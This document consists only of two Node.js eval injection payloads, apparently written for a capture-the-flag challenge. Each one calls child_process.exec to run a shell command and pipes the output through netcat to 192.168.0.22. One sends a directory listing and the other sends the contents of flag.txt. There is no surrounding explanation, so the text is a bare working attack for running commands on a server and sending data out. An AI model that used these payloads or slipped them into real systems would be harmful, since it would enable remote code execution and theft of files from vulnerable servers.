 eval(`require('child_process').exec('ls | nc 192.168.0.22 89',(error, stdout, stderr) => {console.log(stdout);});`)


 eval(`require('child_process').exec('cat flag.txt | nc 192.168.0.22 87',(error, stdout, stderr) => {console.log(stdout);});`)

